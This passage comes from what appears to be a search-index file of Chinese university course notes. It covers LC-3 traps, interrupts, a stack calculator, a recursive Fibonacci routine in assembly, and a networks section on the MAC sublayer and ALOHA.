3.trap\u6307\u4ee4\uff0ctrap\u6307\u4ee4\u4f1a\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u4ee5\u7528\u6237\u7a0b\u5e8f\u7684\u8eab\u4efd\u6267\u884c\u7279\u5b9a\u7684\u670d\u52a1\u5185\u5bb9\uff0c\u6700\u540e\u518d\u8df3\u8f6c\u56de\u6765 4.linkage \u94fe\u63a5\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\uff0c\u4ece\u670d\u52a1\u7a0b\u5e8f\u8fd4\u56de\u7528\u6237\u67e5\u7a0b\u5e8f\u7684\u673a\u5236</p> <p>trap instruction</p> <p>trap\u6307\u4ee4 1111 0000 00100011</p> <p>15\u4f4d\u523012\u4f4d\u4e3a\u64cd\u4f5c\u78011111 11\u4f4d\u52308\u4f4d\u4e3a0000\uff0c\u5fc5\u987b\u5168\u4e3a0 7\u4f4d\u52300\u4f4d \u662ftrap vector \uff0c\u5bf9\u8fd9\u516b\u4f4d\u505a0\u62d3\u5c55zero-extend\uff0c\u4e5f\u5c31\u662f\u5bf9\u5e94x0000\u5230x00FF \u6839\u636ex0000\u5230x00FF\u4e2d\u7684\u5185\u5bb9\uff0c\u4f1a\u53d6\u51fa\u6765\u6240\u5bf9\u5e94\u7684\u7a0b\u5e8f\u7684\u8d77\u59cb\u5730\u5740</p> <p>TRAP\u6307\u4ee4\u7684\u5de5\u4f5c\u673a\u5236\uff0c\u5c06trap vector\u505a\u96f6\u62d3\u5c55\uff0c\u7136\u540e\u5c06\u5176\u88c5\u5165MAR\uff0c\u628a\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u8bfb\u51fa\u6765\u4e4b\u540e\u88c5\u5230MDR \u4e4b\u540e\u5c06\u5f53\u524dPC\u5185\u5bb9\u5b58\u5165\u5bc4\u5b58\u5668R7\uff0c\u7136\u540e\u628aMDR\u91cc\u7684\u5185\u5bb9\u88c5\u5230PC\u4e0a</p> <p>RTI instruction</p> <p>RTI\u6307\u4ee4\uff0c\u7528\u4e8e\u63a7\u5236\u8fd4\u56de\u8c03\u7528\u5b50\u7a0b\u5e8f\u7684\u7a0b\u5e8f</p> <p>1000 000000000 \u64cd\u4f5c\u78011000\uff0c\u6ca1\u6709\u64cd\u4f5c\u6570  </p> <p>\u4f1a\u5c06\u7cfb\u7edf\u5806\u6808\u4e0a\u6700\u524d\u9762\u4e24\u4e2a\u5f39\u51fa\u5230PC\u548cPSR\u4e0a\uff0c\u5982\u679c\u8fd4\u56de\u7684\u8fc7\u7a0b\u4e2d\u6709\u5806\u6808\u533a\u57df\u7684\u5207\u6362\uff0c\u90a3\u4e48\u5c31\u9700\u8981R6\u5bc4\u5b58\u5668\u53bb\u4fdd\u5b58\u53e6\u4e00\u4e2a\u5806\u6808\u6307\u9488\u7684\u72b6\u6001\uff1f</p> <p>TRAP\u6307\u4ee4\u7684\u5b8c\u6574\u8fc7\u7a0b</p> <p>\u7cfb\u7edf\u7a0b\u5e8f\u7684\u7ed3\u5c3e\u4e00\u822c\u60c5\u51b5\u4e0b\u662fJMP R7\uff0c\u7531\u4e8eJMP R7\u6307\u4ee4\u975e\u5e38\u5e38\u89c1 \u5728LC-3\u6c47\u7f16\u4e2d\uff0c\u4e13\u95e8\u7528RET\u8fd9\u4e2a\u6807\u8bc6\u7b26\u6765\u8868\u793aJMP R7\u8fd9\u4e2a\u6307\u4ee4\uff0c\u4e5f\u66f4\u52a0\u5730\u5f62\u8c61</p> <p>\u200b\u200b</p> <p>\u5e38\u7528\u7684\u5b50\u4f8b\u7a0b\uff0c\u5728\u4e0d\u9700\u8981\u7528\u5230\u539f\u6709\u7684\u5bc4\u5b58\u5668\u7684\u6570\u636e\u7684\u65f6\u5019\u5f88\u597d\u7528</p> <p>\u5bf9\u4e8eTRAP\u8c03\u7528\u7684\u7cfb\u7edf\u8f93\u5165\u8f93\u51fa\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\uff0c\u4ee5\u53ca\u505c\u673a\u7684\u5177\u4f53\u5b9e\u73b0\u53ef\u4ee5\u770b\u4e66\u672c\u9644\u5f55A</p> <p>IO\u7684\u8bfb\u5165\u653e\u5728R0\u4e0a</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#interrupts-and-interrupt-driven-io","title":"interrupts and interrupt driven IO","text":"<p>\u4e2d\u65ad\u9a71\u52a8IO\u4f7f\u5f97\u7cfb\u7edf\u4e0d\u7528\u6d6a\u8d39\u5927\u91cf\u65f6\u95f4\u53bb\u63a2\u6d4bReady\u6807\u5fd7\uff0c\u5e76\u4e14\u6709\u5f88\u9ad8\u7684\u9002\u7528\u6027\uff0c\u5982\u679c\u91c7\u7528\u8f6e\u8be2\u65b9\u5f0f\u7684\u8bdd\uff0c\u90a3\u4e48\u4e00\u65e6\u9700\u8981\u8f93\u5165\u5e76\u4e14\u6240\u6709\u7a0b\u5e8f\u505c\u6b62\u7b49\u5f85\u5176\u8f93\u5165\uff0c\u8fd9\u8981\u6c42\u6211\u4eec\u660e\u786e\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u5e94\u5f53\u8fdb\u884c\u8f93\u5165\uff0c\u800c\u4e2d\u65ad\u9a71\u52a8\u53ef\u4ee5\u5728\u7a0b\u5e8f\u8fd0\u884c\u7684\u4efb\u610f\u65f6\u5019\u6253\u65ad\u5e76\u4e14\u8fdb\u884c\u8f93\u5165</p> <p>\u6bd4\u5982\u8bf4\u9700\u8981\u5904\u7406\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528\u4e2d\u65ad\u9a71\u52a8\uff0c\u53ef\u4ee5\u4f7f\u5f97\u8f93\u5165\u4e00\u90e8\u5206\uff0c\u5904\u7406\u4e00\u90e8\u5206\uff0c\u800c\u4e0d\u662f\u7b49\u5230\u5168\u90e8\u8f93\u5165\u5b8c\u4e4b\u540e\u624d\u80fd\u5904\u7406</p> <p>\u200d</p> <p>\u72b6\u6001\u5bc4\u5b58\u5668\u4e2d\u7684\u7b2c14\u4f4d\u79f0\u4e3a\u4e2d\u65ad\u5141\u8bb8\u6807\u5fd7\uff0c\u8bb0\u4e3aIE\uff0c\u82e5IE\u4e3a1\uff0c\u90a3\u4e48\u5176\u6709\u53ef\u80fd\u53d1\u51fa\u4e2d\u65ad\u4fe1\u606f\uff0c\u82e5IE\u4e3a0\uff0c\u90a3\u4e48\u4e2d\u65ad\u4fe1\u606f\u4e0d\u4f1a\u4ea7\u751f</p> <p>\u6211\u4eec\u4e4b\u524d\u4e86\u89e3\u8fc7\u6307\u4ee4\u5468\u671f\uff0c\u5728INT\u4fe1\u606f\u4ea7\u751f\u65f6\uff0c\u5728\u6307\u4ee4\u5468\u671f\u6700\u540estore result\u7684\u65f6\u5019\uff0c\u8fd8\u4f1a\u8fdb\u884c\u4e00\u4e2aINT\u7684\u5224\u65ad\uff0c\u770b\u4f18\u5148\u7ea7\u591f\u4e0d\u591f\u4e2d\u65ad\u6307\u4ee4\uff0c\u5982\u679c\u4f18\u5148\u7ea7\u591f\u4e2d\u65ad\u6307\u4ee4\uff0c\u90a3\u4e48\u8fd4\u56defetch\u4e4b\u524d\uff0c\u7cfb\u7edf\u4f1a\u505a\u4e24\u4e2a\u64cd\u4f5c\uff0c\u4e00\u4e2a\u662f\uff0c\u4fdd\u5b58\u8db3\u591f\u591a\u7684\u72b6\u6001\u4fe1\u606f\u4ee5\u56de\u5230\u4e2d\u65ad\u524d\u7684\u60c5\u51b5\uff0c\u4e00\u4e2a\u662f\u5c06\u670d\u52a1\u4e8e\u8be5\u8bbe\u5907\u8bf7\u6c42\u7684\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\u88c5\u4e0aPC\u5bc4\u5b58\u5668\uff1f</p> <p>AND ADD\u6307\u4ee4\u5373\u4fbf\u662f\u81ea\u5df1\u52a00\u4e5f\u662f\u505a\u4e86\u4e1c\u897f\uff0c\u6539\u53d8\u4e86nzp</p> <p>DMA direct memory access\uff0c\u8ba9\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\u76f4\u63a5\u5177\u6709\u8bbf\u95ee\u5185\u5b58\u7684\u80fd\u529b</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-10-calculator","title":"chapter 10 calculator","text":"<p>\u672c\u7ae0\u662f\u5bf9\u524d\u9762\u6240\u5b66\u77e5\u8bc6\u7684\u4e00\u4e2a\u6c47\u603b\uff0c\u5c06\u4f1a\u5b9e\u73b0\u4e00\u4e2a\u6808\u5f0f\u8ba1\u7b97\u673astack machine \u4e5f\u5c31\u662f\u8bf4\u4e0d\u4f9d\u8d56\u5bc4\u5b58\u5668\u4e2d\u7684\u64cd\u4f5c\u6570\uff0c\u4ec5\u4ec5\u4f9d\u8d56\u6808\u5b9e\u73b0\u8ba1\u7b97\uff0c\u4f8b\u5982ADD \u4ece\u6808\u9876\u63a8\u51fa\u4e24\u4e2a\u5143\u7d20\uff0c\u8fdb\u884c\u52a0\u6cd5\uff0c\u7136\u540e\u5c06\u5176\u538b\u56de\u6808\u4e2d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#data-type-conversion","title":"data type conversion","text":"<p>\u6570\u636e\u7c7b\u578b\u8f6c\u6362\uff0c\u5fc5\u8981\u6027\uff1a\u4ece\u8f93\u5165\u5230\u8ba1\u7b97\uff0c\u6211\u4eec\u8981\u628aASCII\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u8865\u7801\uff1b\u7ed3\u679c\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u9700\u8981\u628a\u8865\u7801\u8f6c\u6362\u4e3aASCII \u6570\u636e\u7c7b\u578b\u8f6c\u6362\u76ee\u7684\u5728\u4e8e\u7ed9\u64cd\u4f5c\u63d0\u4f9b\u6b63\u786e\u7684\u64cd\u4f5c\u6570</p> <p>\u5728\u9ad8\u7ea7\u8bed\u8a00\u4e2d\uff0c\u6d6e\u70b9\u6570\u52a0\u6574\u6570\u7684\u64cd\u4f5c\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u8fd9\u4e5f\u9700\u8981\u63d0\u524d\u628a\u6574\u6570\u8f6c\u6362\u6210\u6d6e\u70b9\u6570\uff0c\u624d\u80fd\u83b7\u5f97\u6b63\u786e\u7684\u7b54\u6848 \u4e0b\u9762\u8bb2\u89e3\u4e00\u4e9b\u91cd\u8981\u7684\u8f6c\u6362\u505a\u6cd5</p> <p>from ASCII to binary</p> <p>\u5bf9\u4e8eASCII\u800c\u8a00\uff0c\u5b83\u7684\u6570\u636e\u662f\u5206\u79bb\u5f0f\u5b58\u50a8\u7684\uff0c\u4f8b\u5982\u201c295\u201d\u662f\u5b58\u50a8\u5728\u4e09\u4e2a\u5185\u5b58\u7a7a\u95f4\u91cc\u7684\uff0c\u56e0\u6b64\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u6570\u636e\u7684\u91cd\u70b9\u5728\u4e8e\u4f4d\u6570\u7684\u8003\u91cf\u4e0e\u8fdb\u4f4d</p> <p>from binary to ASCII</p> <p>\u8fd9\u4e2a\u7b97\u6cd5\u800c\u8a00\uff0c\u4e5f\u662f\u4f4d\u6570\u7684\u8f6c\u6362\u6700\u4e3a\u5173\u952e\uff0c\u4ee5\u4e0a\u4e24\u4e2a\u505a\u6cd5\u5b9e\u9645\u5b9e\u73b0\u90fd\u53ef\u4ee5\u89c1\u4e66\u672c  </p> <p>\u989d\u5916\u76ee\u6807\uff0c\u5b9e\u73b0\u4e00\u4e2aASCII\u8f6c\u4e8c\u8fdb\u5236\uff0c\u7528O1\u7684\u5185\u5b58\uff1b\u5b9e\u73b0\u4e00\u4e2a\u4e8c\u8fdb\u5236\u8f6cASCII\uff0c\u6839\u636e\u4f4d\u6570\u81ea\u52a8\u8c03\u6574\u4ea7\u751fASCII\u7684\u4e2a\u6570</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#arithmetic-using-a-stack","title":"arithmetic using a stack","text":"<p>\u6808\u8ba1\u7b97\u5668\u662f\u4e0e\u663e\u793a\u8ba1\u7b97\u5668\u76f8\u5bf9\u7684\uff0c\u6808\u8ba1\u7b97\u5668\u4e2d\u7684ADD\u4f9d\u8d56\u4e8e\u51fa\u6808\u548c\u5165\u6808\uff0c\u7528\u6808\u8fdb\u884c\u4e34\u65f6\u7684\u5b58\u50a8 \u663e\u793a\u8ba1\u7b97\u5668\u4f9d\u8d56\u4e8e\u6307\u660e\u7684\u5bc4\u5b58\u5668 ADD R5,R4,R6</p> <p>\u8fd9\u91cc\u8bb2\u8ff0\u4e86\u5982\u4f55\u8bb2\u4e00\u4e2a\u7b97\u672f\u8fd0\u7b97\u5f0f\uff0c\u7ffb\u8bd1\u6210\u663e\u793a\u8ba1\u7b97\u5668\u7684\u6307\u4ee4\u548c\u6808\u8ba1\u7b97\u5668\u7684\u6307\u4ee4</p> <p>\u5728\u540e\u9762\u8be6\u7ec6\u8bb2\u8ff0\u4e86\u52a0\u6cd5\uff0c\u4e58\u6cd5\uff0c\u53d6\u53cd\u64cd\u4f5c\u5728\u6808\u8ba1\u7b97\u5668\u4e0a\u7684\u64cd\u4f5c</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E6%A6%82/Introduction%20to%20Computing%20Systems_%20From%20Bits%20%26%20Gates%20to%20C%20%26%20Beyond/#chapter-11-recursive","title":"chapter 11 recursive","text":"<p>\u53ef\u4ee5\u81ea\u5b9a\u4e49trap xx</p> <p>\u4f8b\u5982trapx02 \u53ea\u9700\u5728x0002\u5904\u653e\u597d\u8981\u8c03\u7528\u7a0b\u5e8f\u7684\u5934\u6307\u9488\uff0c\u4f8b\u5982x2000 \u4e00\u822c\u4f1a\u662f\u6709\u7cfb\u7edf\u6743\u9650\u7684\u7a0b\u5e8f</p> <p>\u5b9e\u9645\u5b58\u5728\u7684\u9012\u5f52\u5e76\u4e0d\u50cfc\u8bed\u8a00\u4e2d\u90a3\u4e48\u76f4\u89c2\uff0c\u5728\u6c47\u7f16\u4e2d\u7684\u9012\u5f52\u5e95\u5c42\u5b9e\u73b0\u4e00\u822c\u9700\u8981\u7528\u5230\u6808 \u4f8b\u5982\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u662f\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u9012\u5f52\u5b9e\u73b0</p> <pre><code>;FIB subroutine\n; + FIB(0) = 0\n; + FIB(1) = 1\n; + FIB(n) = FIB(n-1) + FIB(n-1)\n;\n; Input is in R0\n; Return answer in R1\n;\nFIB     ADD R6, R6, #-1\n    STR R7, R6, #0 ; Push R7, the return linkage\n    ADD R6, R6, #-1\n    STR R0, R6, #0 ; Push R0, the value of n\n    ADD R6, R6, #-1\n    STR R2, R6, #0 ; Push R2, which is needed in the subroutine\n; Check for base case\n    AND R2, R0, #-2\n    BRnp SKIP ; Z=0 if R0=0,1\n    ADD R1, R0, #0 ; R0 is the answer\n    BRnzp DONE\n; Not a base case, do the recursion\nSKIP    ADD R0, R0, #-1\n    JSR FIB ; R1 = FIB(n-1)\n    ADD R2, R1, #0 ; Move result before calling FIB again\n    ADD R0, R0, #-1\n    JSR FIB ; R1 = FIB(n-2)\n    ADD R1, R2, R1 ; R1 = FIB(n-1) + FIB(n-2)\n; Restore registers and return\nDONE    LDR R2, R6, #0\n    ADD R6, R6, #1\n    LDR R0, R6, #0\n    ADD R6, R6, #1\n    LDR R7, R6, #0\n    ADD R6, R6, #1\n    RET\n</code></pre> <p>\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u9012\u5f52\u7b97\u6cd5\u90fd\u662f\u76f8\u5f53\u7f13\u6162\u7684</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u7ecf\u9a8c\u5206\u4eab</p> <p>\u8ba1\u7f51\u662f\u6574\u4e2a\u5927\u4e09\u4e0a\u6700\u96be\u8bc4\u4ef7\u7684\u8bfe\uff0c\u4ece\u5176\u5e9e\u5927\u7684\u77e5\u8bc6\u8303\u56f4\uff0c\u548c\u8003\u8bd5\u83ab\u540d\u5176\u5999\u7684\u5b9d\u85cf\u51fa\u9898\u70b9\uff0c\u4ee5\u53ca\u6559\u8003\u5b66\u7528\u5206\u79bb\u7684\u8bfe\u7a0b\u4f53\u9a8c\uff0c\u5230\u5e73\u65f6\u4f5c\u4e1a\u5404\u4e2a\u73ed\u5b8c\u5929\u5dee\u5730\u522b\u7684\u96be\u5ea6\u4ee5\u53ca\u622a\u7136\u4e0d\u540c\u5e73\u65f6\u5206\u7ed9\u5206\u4f53\u5236\uff0c\u90fd\u53ef\u89c1\u8fd9\u95e8\u8bfe\u7684\u5e7d\u9ed8\u4e4b\u5904\u3002\u5bf9\u4e8e\u8fd9\u95e8\u8bfe\uff0c\u4e2a\u4eba\u6709\u4e00\u4e9b\u5efa\u8bae\uff1a\u9996\u5148\u9009\u4e2a\u597d\u8001\u5e08\uff0c\u4f60\u5c06\u4f1a\u62e5\u6709\u76f8\u5bf9\u8f7b\u677e\u7684\u5e73\u65f6\u4f5c\u4e1a\uff0c\u8f7b\u677e\u62ff\u6ee1\u7684\u5e73\u65f6\u5206\u3002\u5176\u6b21\uff0c\u8003\u524d\u7ec4\u961f\u590d\u4e60\uff0c\u8fd9\u95e8\u8bfe\u77e5\u8bc6\u4f53\u7cfb\u4e4b\u5e9e\u5927\u96be\u4ee5\u7a77\u5c3d\uff0c\u671f\u672b\u8865\u5929\u60f3\u8981\u53d6\u5f97\u9ad8\u5206\u96be\u5ea6\u8f83\u9ad8\uff0c\u4f46\u662f\u5f88\u591a\u8001\u5e08\u671f\u672b\u4f1a\u5212\u91cd\u70b9\uff08\u5176\u5b9e\u6709\u4e9b\u5c31\u662f\u900f\u9898\uff09\uff0c\u56e0\u6b64\u6700\u597d\u5927\u5bb6\u7ec4\u56e2\u53bb\u8bb0\u5f55\u590d\u4e60\u8bfe\uff0c\u53ef\u4ee5\u6709\u6548\u63d0\u9ad8\u671f\u672b\u590d\u4e60\u7684\u6548\u7387\uff0c\u5c24\u5176\u662f\u8bb8\u6d77\u6d9b\u8001\u5e08\u5212\u7684\u91cd\u70b9\uff0c\u57fa\u672c\u5c31\u662f\u6309\u7167\u671f\u672b\u5377\u5b50\u6765\u7684\uff08\u8001\u5e08\u672c\u4eba\u94a6\u5b9a\uff09\u3002\u6700\u540e\u5c31\u662f\u8ba4\u771f\u590d\u4e60\uff0c\u5e76\u4e14\u8fd9\u95e8\u8bfe\u4e0d\u5b58\u5728\u6240\u8c13\u7684\u91cd\u70b9\uff0c\u4efb\u4f55\u7284\u89d2\u65ee\u65ef\u91cc\u7684\u77e5\u8bc6\u90fd\u6709\u53ef\u80fd\u662f\u8003\u8bd5\u7684\u4e3b\u5e72\u77e5\u8bc6\u3002</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/","title":"\u8ba1\u7b97\u673a\u7f51\u7edc","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u7ecf\u9a8c\u5206\u4eab</p> <p>\u8ba1\u7f51\u662f\u6574\u4e2a\u5927\u4e09\u4e0a\u6700\u96be\u8bc4\u4ef7\u7684\u8bfe\uff0c\u4ece\u5176\u5e9e\u5927\u7684\u77e5\u8bc6\u8303\u56f4\uff0c\u548c\u8003\u8bd5\u83ab\u540d\u5176\u5999\u7684\u5b9d\u85cf\u51fa\u9898\u70b9\uff0c\u4ee5\u53ca\u6559\u8003\u5b66\u7528\u5206\u79bb\u7684\u8bfe\u7a0b\u4f53\u9a8c\uff0c\u5230\u5e73\u65f6\u4f5c\u4e1a\u5404\u4e2a\u73ed\u5b8c\u5929\u5dee\u5730\u522b\u7684\u96be\u5ea6\u4ee5\u53ca\u622a\u7136\u4e0d\u540c\u5e73\u65f6\u5206\u7ed9\u5206\u4f53\u5236\uff0c\u90fd\u53ef\u89c1\u8fd9\u95e8\u8bfe\u7684\u5e7d\u9ed8\u4e4b\u5904\u3002\u5bf9\u4e8e\u8fd9\u95e8\u8bfe\uff0c\u4e2a\u4eba\u6709\u4e00\u4e9b\u5efa\u8bae\uff1a\u9996\u5148\u9009\u4e2a\u597d\u8001\u5e08\uff0c\u4f60\u5c06\u4f1a\u62e5\u6709\u76f8\u5bf9\u8f7b\u677e\u7684\u5e73\u65f6\u4f5c\u4e1a\uff0c\u8f7b\u677e\u62ff\u6ee1\u7684\u5e73\u65f6\u5206\u3002\u5176\u6b21\uff0c\u8003\u524d\u7ec4\u961f\u590d\u4e60\uff0c\u8fd9\u95e8\u8bfe\u77e5\u8bc6\u4f53\u7cfb\u4e4b\u5e9e\u5927\u96be\u4ee5\u7a77\u5c3d\uff0c\u671f\u672b\u8865\u5929\u60f3\u8981\u53d6\u5f97\u9ad8\u5206\u96be\u5ea6\u8f83\u9ad8\uff0c\u4f46\u662f\u5f88\u591a\u8001\u5e08\u671f\u672b\u4f1a\u5212\u91cd\u70b9\uff08\u5176\u5b9e\u6709\u4e9b\u5c31\u662f\u900f\u9898\uff09\uff0c\u56e0\u6b64\u6700\u597d\u5927\u5bb6\u7ec4\u56e2\u53bb\u8bb0\u5f55\u590d\u4e60\u8bfe\uff0c\u53ef\u4ee5\u6709\u6548\u63d0\u9ad8\u671f\u672b\u590d\u4e60\u7684\u6548\u7387\uff0c\u5c24\u5176\u662f\u8bb8\u6d77\u6d9b\u8001\u5e08\u5212\u7684\u91cd\u70b9\uff0c\u57fa\u672c\u5c31\u662f\u6309\u7167\u671f\u672b\u5377\u5b50\u6765\u7684\uff08\u8001\u5e08\u672c\u4eba\u94a6\u5b9a\uff09\u3002\u6700\u540e\u5c31\u662f\u8ba4\u771f\u590d\u4e60\uff0c\u5e76\u4e14\u8fd9\u95e8\u8bfe\u4e0d\u5b58\u5728\u6240\u8c13\u7684\u91cd\u70b9\uff0c\u4efb\u4f55\u7284\u89d2\u65ee\u65ef\u91cc\u7684\u77e5\u8bc6\u90fd\u6709\u53ef\u80fd\u662f\u8003\u8bd5\u7684\u4e3b\u5e72\u77e5\u8bc6\u3002</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/","title":"\u4ecb\u8d28\u8bbf\u95ee\u5b50\u5c42","text":"<p>\u6211\u4eec\u4e4b\u524d\u5728\u6570\u636e\u94fe\u8def\u5c42\u8ba8\u8bba\u8fc7\u7684\u534f\u8bae\u90fd\u662f \u70b9\u5bf9\u70b9\u94fe\u63a5 point-to-point connections \u7684\uff0c\u4f46\u662f\u5728LAN\uff08\u5c40\u57df\u7f51\u7528\u7684\u90fd\u662f\u5e7f\u64ad\u4fe1\u9053\uff09\u7b49\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u9700\u8981\u5e7f\u64ad\u4fe1\u9053 boardcast channels\uff0c\u4e5f\u79f0\u4e3a \u591a\u8def\u8bbf\u95ee\u4fe1\u9053 multiaccess channel \u6216 \u968f\u673a\u8bbf\u95ee\u4fe1\u9053 random access channel</p> <p>\u5bf9\u4e8e\u5e7f\u64ad\u4fe1\u9053\u800c\u8a00\uff0c\u6700\u5173\u952e\u7684\u95ee\u9898\u662f\u4fdd\u8bc1\u591a\u65b9\u4e89\u7528\u4fe1\u9053\u65f6\u786e\u8ba4\u8c01\u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\uff0c\u8ba9\u4ed6\u4eec\u90fd\u6210\u529f\u53d1\u9001\u4fe1\u606f\u3002</p> <p>\u7528\u6765\u786e\u5b9a\u591a\u8def\u8bbf\u95ee\u4fe1\u9053\u7684\u4e0b\u4e00\u4e2a\u4f7f\u7528\u8005\u7684\u534f\u8bae\uff0c\u5c5e\u4e8eLink Layer\u7684\u4e00\u4e2a\u5b50\u5c42\uff0c\u4e5f\u5c31\u662f\u4ecb\u8d28\u8bbf\u95ee\u63a7\u5236\u5b50\u5c42 MAC\uff0cMedium Access Control Sublayer</p> <p>OSI \u4e03\u5c42\u6a21\u578b\u5c06Data Link Layer\u5206\u6210\u4e86 LLC\uff08Logical Link Control\uff09\u548c MAC\u4e24\u4e2a\u5b50\u5c42</p> <p>\u200b\u200b</p> <ul> <li>Flow Control\u5c31\u4f8b\u5982\u4e0a\u4e00\u7ae0\u7684\u6ed1\u52a8\u7a97\u53e3\u7b49\u7b49</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#1","title":"1. \u5e7f\u64ad\u4fe1\u9053\u4f20\u8f93\u534f\u8bae","text":"<p>\u6700\u57fa\u7840\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u53ef\u4ee5\u505a\u65f6\u5206\u590d\u7528\u548c\u9891\u5206\u590d\u7528\uff08Static FDM / TDM\uff09</p> <p>\u4f46\u662f\u6709\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u6211\u4eec\u53ea\u6709\u4e00\u4e2a\u7528\u6237\u60f3\u53d1\u6d88\u606f\uff0c\u90a3\u4e48\u5176\u4f59\u7684\u65f6\u95f4\u7247\u5168\u6570\u6d6a\u8d39\u4e86\uff0c\u5e76\u4e14\u5982\u679c\u6211\u8981\u589e\u52a0\u4e00\u4e2a\u7528\u6237\uff0c\u4f1a\u5f88\u9ebb\u70e6\uff0c\u5176\u65e0\u6cd5\u52a8\u6001\u7684\u589e\u957f\u53ef\u5bb9\u7eb3\u7684\u7528\u6237\u6570\u91cf</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#11-aloha-additive-links-on-line-hawaii-area","title":"1.1 ALOHA Additive Links On-line Hawaii Area","text":"<p>Pure ALOHA</p> <p>\u57fa\u672c\u601d\u60f3\u5728\u4e8e\uff0c\u6bcf\u4e2a\u7528\u6237\u6709\u6570\u636e\u8981\u53d1\u5c31\u53d1\uff0c\u4f46\u5f53\u4e24\u4e2a\u7528\u6237\u53d1\u9001\u4fe1\u53f7\u91cd\u53e0\u65f6\uff08\u6211\u4eec\u79f0\u4e3a \u51b2\u7a81 collision\uff09\uff0c\u51b2\u7a81\u7684\u5e27\u5c31\u4f1a\u635f\u574f\uff0cALOHA\u8981\u6c42\u53d1\u9001\u65b9\u53ef\u4ee5\u77e5\u9053\u6240\u53d1\u9001\u7684\u578b\u53f7\u662f\u5426\u53d1\u751f\u4e86\u51b2\u7a81\u3002</p> <p>\u8fd9\u79cd\u91c7\u7528\u4e86\u53ef\u80fd\u5f15\u8d77\u51b2\u7a81\u7684\u5171\u4eab\u4fe1\u9053\u7684\u65b9\u6cd5\u79f0\u4e3a \u7ade\u4e89\u7cfb\u7edf contention system</p> <p>\u200b\u200b</p> <p>ALOHA \u6700\u521d\u7684\u5e94\u7528\u573a\u666f\u4e2d\uff0c\u662f\u4e00\u5806\u7528\u6237\u9700\u8981\u548c\u4e2d\u592e\u8ba1\u7b97\u673a\u901a\u4fe1\uff0c\u8fd9\u4e9b\u7528\u6237\u91c7\u7528ALOHA\uff0c\u7136\u540e\u4e2d\u592e\u8ba1\u7b97\u673a\u4f1a\u5c06\u6536\u5230\u7684\u5e27\u5e7f\u64ad\u53d1\u56de\uff0c\u53d1\u9001\u65b9\u4fa6\u542c\u53d1\u56de\u7684\u5e27\u5c31\u53ef\u4ee5\u77e5\u9053\u662f\u5426\u53d1\u751f\u51b2\u7a81\u3002</p> <p>\u5728\u5176\u4ed6\u7cfb\u7edf\u4e2d\uff0c\u53d1\u9001\u65b9\u53ef\u4ee5\u76f4\u63a5\u4fa6\u542c\u53d1\u9001\u7684\u5e27\u662f\u5426\u53d1\u751f\u51b2\u7a81\uff1b\u6216\u8005\u7b49\u5f85\u63a5\u6536\u65b9\u53d1\u56deACK\u548cNACK</p> <p>\u5f53\u53d1\u9001\u65b9\u4fa6\u6d4b\u5230\u51b2\u7a81\uff0c\u6536\u5230NAK\u6216\u8005\u4e00\u6bb5\u65f6\u95f4\u672a\u6536\u5230\u56de\u590d\u65f6\uff1b\u5176\u4f1a\u5728\u7b49\u5f85\u4e00\u6bb5\u968f\u673a\u65f6\u95f4\u540e\u518d\u6b21\u53d1\u9001\u8be5\u5e27\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u95f4\u4e0d\u968f\u673a\uff0c\u90a3\u4e48\u8be5\u53d1\u751f\u7684\u51b2\u7a81\u4ecd\u7136\u4f1a\u53d1\u751f</p> <p>\u6700\u597d\u60c5\u51b5\u4e0b Pure ALOHA\u7684\u4fe1\u9053\u5229\u7528\u7387\u671f\u671b\u7ea6\u4e3a \\(1/2e\\) \u7ea6\u4e3a 18%\uff0c\u662f\u6bd4\u8f83\u4f4e\u7684</p> <p>Slotted ALOHA</p> <p>\u4e0a\u8ff0Pure 